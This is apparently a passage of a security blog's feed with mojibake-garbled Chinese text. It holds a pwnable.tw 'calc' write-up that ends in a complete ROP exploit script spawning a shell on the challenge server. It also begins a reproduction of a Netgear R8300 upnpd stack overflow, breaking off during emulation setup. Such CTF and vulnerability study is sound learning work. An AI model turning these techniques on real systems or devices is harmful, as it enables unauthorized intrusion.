    <title>pwnable.tw calc wp</title>
    <link href="p1Kk.github.io/2021/02/07/tw/tw%20calc/"/>
    <id>p1Kk.github.io/2021/02/07/tw/tw%20calc/</id>
    <published>2021-02-06T16:00:00.000Z</published>
    <updated>2021-02-08T03:54:35.563Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ä¸ªé¢˜ç›®å¯¹æˆ‘æ¥è¯´è¿˜æ˜¯è›®æœ‰ä»·å€¼çš„â€¦</p><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>ä¸”ä¸º<strong>é™æ€ç¼–è¯‘</strong></p><h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/calc.png" alt="calc"><br><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/get_expr.png" alt="get_expr"><br><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/parse_expt.png" alt="parse_expt"></p><p>æ•´ä¸ªæµç¨‹ä¹Ÿå°±æ˜¯ï¼š</p><ol><li>å¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œæœ€ç»ˆå¾—åˆ°çš„å­—ç¬¦ä¸²å­˜å…¥inputä¸­</li><li>å°†inputè¿›è¡Œè§£æ<ul><li>å…ˆæŸ¥æ‰¾è¿ç®—ç¬¦</li><li>å°†é‡åˆ°çš„æ•°å­—ä¿å­˜åˆ°poolä¸­ï¼Œpool[0]ä¸ºå½“å‰éå†åˆ°çš„æ•°å­—æ•°é‡ï¼Œé€šè¿‡pool[0]æ¥ç´¢å¼•å­˜æ”¾ä½ç½®</li><li>åˆ¤æ–­å­˜å…¥operatorä¸­çš„è¿ç®—ç¬¦ä¼˜å…ˆçº§ï¼Œåœ¨eval()ä¸­è¿›è¡Œè¿ç®—æ“ä½œ</li></ul></li><li>åˆ©ç”¨è¿ç®—ç¬¦å’Œpoolä¸­æœ€åä¸¤ä¸ªæ•°å­—è¿›è¡Œè¿ç®—ï¼Œå°†ç»“æœä¿å­˜åœ¨pool[-2]ï¼ŒåŒæ—¶â€“pool[0]</li></ol><h1 id="0x02-åˆ†æ"><a href="#0x02-åˆ†æ" class="headerlink" title="0x02 åˆ†æ"></a>0x02 åˆ†æ</h1><p>ç»¼ä¸Šï¼Œå¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦å°±æ˜¯è¿ç®—ç¬¦ï¼Œå¦‚<code>+10</code></p><p>â‘ ç¬¬ä¸€æ¬¡è¿ç®— ï¼Œæ­¤æ—¶ pool[0] = 1, pool[1] = 10ï¼ŒæŒ‰ç…§ä¸Šé¢çš„é€»è¾‘ï¼Œå°±ä¼šè¿ç®— 1+10 = 11ï¼Œå¹¶å°†ç»“æœ11å­˜æ”¾åœ¨pool[0]ä¸­ï¼Œpool[0]å†è‡ªå‡ï¼Œå°±æ˜¯pool[0]=10ã€‚è¾“å‡ºç»™ç”¨æˆ·çš„å°±æ˜¯pool[10]ã€‚</p><p>å¦‚æœè¾“å…¥çš„æ˜¯<code>+10+1</code></p><p>å…ˆåŒä¸Šâ‘ ï¼Œå†â‘¡ç¬¬äºŒæ¬¡è¿ç®—ï¼Œæ­¤æ—¶ pool[0] = 11, ã€æ ¹æ®pool[0]å¾—åˆ°ä¸‹ä¸€ä½ä¸ºã€‘pool[11] = 1ï¼Œè¿ç®—ç»“æœå­˜æ”¾åœ¨pool[10] = pool[11] + pool[10] = pool[10] + 1</p><p>è¯´æ˜å¯ä»¥å¾—åˆ°å¯æ§ n çš„pool[n]â€”â€”å¯ä»¥æ³„éœ²å‡ºpool[n]ï¼Œä¹Ÿå¯ä»¥ç¯¡æ”¹pool[n]å¤„çš„å€¼ã€‚</p><p>ä½†æ˜¯è¿˜éœ€è¦æ³¨æ„ä¸€ç‚¹</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/init_pool.png" alt></p><p>è¿”å›åœ°å€è·ç¦»*poolä¸º(0x5A0+4)/4 = 0x169 = 361</p><p>ç”±äºæ˜¯é™æ€ç¼–è¯‘ï¼Œæˆ‘ä»¬è€ƒè™‘åœ¨retåæ„é€ ROPï¼šint 80hè°ƒç”¨execve(â€œ/bin/shâ€)ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ„é€ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">eax = 11</span><br><span class="line">ebx = addr(&quot;/bin/sh&quot;)</span><br><span class="line">ecx = 0</span><br><span class="line">edx = 0</span><br><span class="line">å³ï¼š</span><br><span class="line">+-----------------------------+</span><br><span class="line">|     addr(pop eax; ret)      | --ret--&gt; pool[361]</span><br><span class="line">+-----------------------------+</span><br><span class="line">|              11             | -------&gt; pool[362]</span><br><span class="line">+-----------------------------+</span><br><span class="line">|      addr(pop edx; ret)     |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|              0              |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| addr(pop ecx; pop ebx; ret) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|              0              |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|       addr(&quot;/bin/sh&quot;)       |â€”â€”â€”â€”â€”â€”+</span><br><span class="line">+-----------------------------+      |  </span><br><span class="line">|        addr(int 80h)        |      |    </span><br><span class="line">+-----------------------------+      |</span><br><span class="line">|            &quot;/bin&quot;           |&lt;â€”â€”â€”â€”â€”+  pool[369]</span><br><span class="line">+-----------------------------+     </span><br><span class="line">|          &quot;/sh\x00&quot;          |       </span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾å¯ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./calc --only  &quot;pop|ret&quot;</span><br><span class="line">0x0805c34b : pop eax ; ret</span><br><span class="line">0x080701aa : pop edx ; ret</span><br><span class="line">0x080701d1 : pop ecx ; pop ebx ; ret</span><br><span class="line">$ ROPgadget --binary ./calc --only  &quot;int&quot;</span><br><span class="line">0x08049a21 : int 0x80</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æˆ‘ä»¬å†™å…¥æ ˆä¸­çš„/bin/shåœ°å€è¿˜éœ€è¦çŸ¥é“å½“å‰æ ˆåŸºå€ï¼Œpool[361]ä¸ºretï¼Œpool[360]ä¸ºold ebpå³mainçš„ebpï¼Œå°±å¯ä»¥å¾—åˆ°mainçš„åŸºå€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:08049452                 push    ebp</span><br><span class="line">.text:08049453                 mov     ebp, esp</span><br><span class="line">.text:08049455                 and     esp, 0FFFFFFF0hğŸ”º</span><br><span class="line">.text:08049458                 sub     esp, 10h</span><br></pre></td></tr></table></figure><p><code>oldEbp&amp;0FFFFFFF0h-0x10</code>å°±æ˜¯retåœ°å€ã€‚</p><p>è¿˜éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œæˆ‘ä»¬è¾“å…¥+360åï¼Œè¿”å›çš„åœ°å€ä¸ºè´Ÿæ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬è®¡ç®—çš„æ—¶å€™å…ˆè½¬æ¢æˆæ­£æ•°ï¼Œå†è½¬æ¢å›æ¥ã€‚</p><hr><p>è¿˜æœ‰ä¸€ç§å¿«æ·è§£æ³•å°±æ˜¯åˆ©ç”¨ropchainï¼Œç›´æ¥å¸ƒç½®åˆ°æ ˆä¸Šå°±å¯ä»¥</p><h1 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line"># Padding goes here</span><br><span class="line">p = &apos;&apos;</span><br><span class="line"></span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .data</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; ret</span><br><span class="line">p += &apos;/bin&apos;</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec064) # @ .data + 4</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; ret</span><br><span class="line">p += &apos;//sh&apos;</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080481d1) # pop ebx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .data</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701d1) # pop ecx ; pop ebx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # padding without overwrite ebx</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x08049a21) # int 0x80</span><br><span class="line"></span><br><span class="line">binary = &quot;./calc&quot;</span><br><span class="line">ip = &quot;chall.pwnable.tw&quot;</span><br><span class="line">port = 10100</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">def pwn(ip, port, debug):</span><br><span class="line">global io</span><br><span class="line">if debug == 1:</span><br><span class="line">io = process(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">else:</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">libc = 0</span><br><span class="line">io.recv()</span><br><span class="line">for i in range(len(p)/4):</span><br><span class="line">io.sendline(&apos;+&apos; + str(361+i))</span><br><span class="line">recv = int(io.recv())</span><br><span class="line">print &quot;+&quot;+str(361+i)+&quot; = &quot;+hex(recv)</span><br><span class="line">content = u32(p[i*4:i*4+4])</span><br><span class="line">print&quot;content = &quot;+hex(content)</span><br><span class="line">if content &lt; recv:</span><br><span class="line">recv = recv - content</span><br><span class="line">io.sendline(&apos;+&apos; + str(361+i) + &apos;-&apos; + str(recv))</span><br><span class="line">else:</span><br><span class="line">recv = content-recv</span><br><span class="line">io.sendline(&apos;+&apos; + str(361+i) + &apos;+&apos; + str(recv))    </span><br><span class="line">print &quot;final = &quot;+hex(int(io.recv()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">pwn(ip, port, 0)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™ä¸ªé¢˜ç›®å¯¹æˆ‘æ¥è¯´è¿˜æ˜¯è›®æœ‰ä»·å€¼çš„â€¦&lt;/p&gt;
&lt;h1 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h1&gt;&lt;h2 id=&quot;checksec&quot;&gt;&lt;a href=&quot;#checksec&quot; cla</summary>
      
    
    
    
    <category term="oj" scheme="p1Kk.github.io/categories/oj/"/>
    
    
    <category term="pwn" scheme="p1Kk.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="p1Kk.github.io/tags/wp/"/>
    
    <category term="tw" scheme="p1Kk.github.io/tags/tw/"/>
    
  </entry>
  
  <entry>
    <title>Netgear R8300 PSV-2020-0211æ ˆæº¢å‡ºå¤ç°</title>
    <link href="p1Kk.github.io/2020/12/20/iot/Netgear%20R8300/"/>
    <id>p1Kk.github.io/2020/12/20/iot/Netgear%20R8300/</id>
    <published>2020-12-19T16:00:00.000Z</published>
    <updated>2021-04-14T12:53:59.244Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å¤ç°ä¸€ä¸ªNetgear R8300è®¾å¤‡çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œè¦æ±‚æ˜¯ç¼–å†™å…ˆæ¢æµ‹ç›®æ ‡ç‰ˆæœ¬å·ï¼Œå†å‘é€payloadçš„POC</p></blockquote><h1 id="ARMå‰è¨€"><a href="#ARMå‰è¨€" class="headerlink" title="ARMå‰è¨€"></a>ARMå‰è¨€</h1><h2 id="arm32æŒ‡ä»¤"><a href="#arm32æŒ‡ä»¤" class="headerlink" title="arm32æŒ‡ä»¤"></a>arm32æŒ‡ä»¤</h2><table><thead><tr><th><strong>æŒ‡ä»¤</strong></th><th><strong>æè¿°</strong></th><th><strong>æŒ‡ä»¤</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td>MOV</td><td>ç§»åŠ¨æ•°æ®</td><td>EOR</td><td>æŒ‰ä½å¼‚æˆ–</td></tr><tr><td>MVN</td><td>ç§»åŠ¨å¹¶å–å</td><td>LDR</td><td>åŠ è½½</td></tr><tr><td>ADD</td><td>åŠ </td><td>STR</td><td>å­˜å‚¨</td></tr><tr><td>SUB</td><td>å‡</td><td>LDM</td><td>åŠ è½½å¤šä¸ª</td></tr><tr><td>MUL</td><td>ä¹˜</td><td>STM</td><td>å­˜å‚¨å¤šä¸ª</td></tr><tr><td>LSL</td><td>é€»è¾‘å·¦ç§»</td><td>PUSH</td><td>å…¥æ ˆ</td></tr><tr><td>LSR</td><td>é€»è¾‘å³ç§»</td><td>POP</td><td>å‡ºæ ˆ</td></tr><tr><td>ASR</td><td>ç®—æœ¯å³ç§»</td><td>B</td><td>è·³è½¬</td></tr><tr><td>ROR</td><td>å³æ—‹</td><td>BL</td><td>Linkè·³è½¬</td></tr><tr><td>CMP</td><td>æ¯”è¾ƒ</td><td>BX</td><td>åˆ†æ”¯è·³è½¬</td></tr><tr><td>AND</td><td>æŒ‰ä½ä¸</td><td>BLX</td><td>ä½¿ç”¨Linkåˆ†æ”¯è·³è½¬</td></tr><tr><td>ORR</td><td>æŒ‰ä½æˆ–</td><td>SWI/SVC</td><td>ç³»ç»Ÿè°ƒç”¨</td></tr></tbody></table><table><thead><tr><th align="center">ARMæ¶æ„ å¯„å­˜å™¨å</th><th align="center">å¯„å­˜å™¨æè¿°</th><th align="center">Intelæ¶æ„ å¯„å­˜å™¨å</th></tr></thead><tbody><tr><td align="center">R0</td><td align="center">é€šç”¨å¯„å­˜å™¨</td><td align="center">EAX</td></tr><tr><td align="center">R1~R5</td><td align="center">é€šç”¨å¯„å­˜å™¨</td><td align="center">EBXã€ECXã€EDXã€EDIã€ESI</td></tr><tr><td align="center">R6~R10</td><td align="center">é€šç”¨å¯„å­˜å™¨</td><td align="center">æ— </td></tr><tr><td align="center">R11(FP)</td><td align="center">æ ˆå¸§æŒ‡é’ˆ</td><td align="center">EBP</td></tr><tr><td align="center">R12(IP)</td><td align="center">å†…éƒ¨ç¨‹åºè°ƒç”¨</td><td align="center">æ— </td></tr><tr><td align="center">R13(SP)</td><td align="center">å †æ ˆæŒ‡é’ˆ</td><td align="center">ESP</td></tr><tr><td align="center">R14(LP)</td><td align="center">é“¾æ¥å¯„å­˜å™¨</td><td align="center">æ— </td></tr><tr><td align="center">R15(PC)</td><td align="center">ç¨‹åºè®¡æ•°å™¨</td><td align="center">EIP</td></tr><tr><td align="center">CPSR</td><td align="center">ç¨‹åºçŠ¶æ€å¯„å­˜å™¨</td><td align="center">EFLAGS</td></tr></tbody></table><h2 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a>32ä½</h2><ol><li><p>å‚æ•°ä¼ é€’</p><p>å‰4ä¸ªå‚æ•°é€šè¿‡R0 ~ R3ä¼ é€’ï¼Œç¬¬4ä¸ªå‚æ•°éœ€è¦é€šè¿‡spè®¿é—®ï¼Œç¬¬5ä¸ªå‚æ•°éœ€è¦sp+4è®¿é—®ï¼Œç¬¬nä¸ªå‚æ•°éœ€è¦é€šè¿‡sp + 4*(n-4)è®¿é—®ï¼›å½“å‚æ•°ä¸ªæ•°å¤šäº4ä¸ªæ—¶ï¼Œå°†å¤šä½™çš„å‚æ•°é€šè¿‡æ•°æ®æ ˆè¿›è¡Œä¼ é€’ï¼Œå…¥æ ˆé¡ºåºä¸å‚æ•°é¡ºåºæ­£å¥½ç›¸åï¼Œå­ç¨‹åºè¿”å›å‰æ— éœ€æ¢å¤R0~R3çš„å€¼</p></li><li><p>åœ¨å­ç¨‹åºä¸­ï¼Œä½¿ç”¨R4~R11ä¿å­˜å±€éƒ¨å˜é‡ï¼Œè‹¥ä½¿ç”¨éœ€è¦å…¥æ ˆä¿å­˜ï¼Œå­ç¨‹åºè¿”å›å‰éœ€è¦æ¢å¤è¿™äº›å¯„å­˜å™¨ï¼›R12æ˜¯ä¸´æ—¶å¯„å­˜å™¨ï¼Œä½¿ç”¨ä¸éœ€è¦ä¿å­˜</p></li><li><p>å­ç¨‹åºè¿”å›32ä½çš„æ•´æ•°ï¼Œä½¿ç”¨R0è¿”å›ï¼›è¿”å›64ä½æ•´æ•°æ—¶ï¼Œä½¿ç”¨R0è¿”å›ä½ä½ï¼ŒR1è¿”å›é«˜ä½</p></li></ol><h2 id="64ä½"><a href="#64ä½" class="headerlink" title="(64ä½)"></a>(64ä½)</h2><ol><li><p>å‚æ•°ä¼ é€’</p><p>å‰8ä¸ªå‚æ•°æ˜¯é€šè¿‡x0~x7ä¼ é€’ï¼Œç¬¬8ä¸ªå‚æ•°éœ€è¦é€šè¿‡spè®¿é—®ï¼Œç¬¬9ä¸ªå‚æ•°éœ€è¦é€šè¿‡sp + 8 è®¿é—®ï¼Œç¬¬nä¸ªå‚æ•°éœ€è¦é€šè¿‡sp + 8*(n-8)è®¿é—®ã€‚</p></li></ol><h2 id="å¶å‡½æ•°-éé¡µå‡½æ•°"><a href="#å¶å‡½æ•°-éé¡µå‡½æ•°" class="headerlink" title="å¶å‡½æ•° éé¡µå‡½æ•°"></a>å¶å‡½æ•° éé¡µå‡½æ•°</h2><p>å¶å‡½æ•°æ˜¯æŒ‡æœ¬èº«ä¸ä¼šè°ƒç”¨å…¶ä»–å‡½æ•°ã€‚éå¶å‡½æ•°æ˜¯æŒ‡é™¤äº†å®ƒè‡ªå·±çš„é€»è¾‘å¤–ï¼Œè¿˜ä¼šè°ƒç”¨åˆ°å…¶ä»–çš„å‡½æ•°ã€‚</p><h1 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h1><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/sub_1D020.png" alt="sub_1D020"><br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/sub_25E04.png" alt="sub_25E04"></p><p>0x634-0x58=0x5dcå³å¯æº¢å‡ºv40ï¼Œ0x634-0x34è¦†ç›–åˆ°v51æŒ‡é’ˆ</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>å›ºä»¶ä¸‹è½½åœ°å€ï¼š<a href="https://www.netgear.com/support/product/R8300.aspx#Firmware%20Version%201.0.2.130" target="_blank" rel="noopener">https://www.netgear.com/support/product/R8300.aspx#Firmware%20Version%201.0.2.130</a></p><ul><li><p>qemu-armï¼š<a href="https://people.debian.org/~aurel32/qemu/armhf/" target="_blank" rel="noopener">https://people.debian.org/~aurel32/qemu/armhf/</a></p><p>ï¼ˆç³»ç»Ÿæ€ï¼‰<a href="https://www.jianshu.com/p/cd7d9a753433" target="_blank" rel="noopener">https://www.jianshu.com/p/cd7d9a753433</a></p></li><li><p>å®‰è£…arm-linux-gcc</p></li><li><p>å®‰è£… <a href="https://github.com/firmadyne/firmadyne" target="_blank" rel="noopener">https://github.com/firmadyne/firmadyne</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cd ./firmadyne/sources/libnvram</span><br><span class="line">$ make clean &amp;&amp; CC=/opt/cross/arm-linux-musleabi/bin/arm-linux-musleabi-gcc make &amp;&amp; mv libnvram.so ../../binaries/libnvram.so.armel</span><br><span class="line">$ cp libnvram.so ã€å›ºä»¶ç›®å½•ã€‘/firmadyne/libnvram.so.armel</span><br><span class="line">åœ¨å›ºä»¶ç›®å½•ä¸‹</span><br><span class="line">$ mkdir -p /firmadyne/libnvram/</span><br><span class="line">$ mkdir -p /firmadyne/libnvram.override/</span><br></pre></td></tr></table></figure></li><li><p><del>busybox</del></p></li></ul><h2 id="user-mod"><a href="#user-mod" class="headerlink" title="user mod"></a>user mod</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp $(which qemu-arm-static) .</span><br><span class="line">$ sudo chroot . ./qemu-arm-static --strace ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°æ—¥å¿—     <code>31181 open(&quot;/var/run/upnpd.pid&quot;,O_RDWR|O_CREAT|O_TRUNC,0666) = -1 errno=2 (No such file or directory)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ll ./</span><br><span class="line">total 5972</span><br><span class="line">......</span><br><span class="line">lrwxrwxrwx  1 kk kk       7 Dec 12  2018 var -&gt; tmp/var/</span><br><span class="line">drwxr-xr-x  8 kk kk   28672 Dec 12  2018 www/</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ›å»º<code>./tmp/var/run</code>ç›®å½•ï¼Œæˆ–é€šè¿‡<a href="https://www.cnblogs.com/from-zero/p/12957978.html" target="_blank" rel="noopener">ä½¿ç”¨-Lå‚æ•°</a>è§£å†³</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir -p ./tmp/var/run</span><br></pre></td></tr></table></figure><p>å†æ¬¡è¿è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chroot . ./qemu-arm-static ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><p>å¤§é‡æŠ¥é”™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">open: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br></pre></td></tr></table></figure><p>å…³äº<code>LD_PRELOAD</code>â€”<a href="https://payloads.online/archivers/2020-01-01/1#" target="_blank" rel="noopener">https://payloads.online/archivers/2020-01-01/1#</a></p><h3 id="ä¿®å¤NVRAMé”™è¯¯"><a href="#ä¿®å¤NVRAMé”™è¯¯" class="headerlink" title="ä¿®å¤NVRAMé”™è¯¯"></a>ä¿®å¤NVRAMé”™è¯¯</h3><ul><li>æ³•ä¸€</li></ul><p><a href="https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c" target="_blank" rel="noopener">https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ arm-linux-gcc -Wall -fPIC -shared nvram.c -o nvram.so</span><br><span class="line">$ sudo chroot ./ ./qemu-arm-static -E LD_PRELOAD=nvram.so ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><p>æŠ¥é”™ï¼š</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/8300libcso6.png" 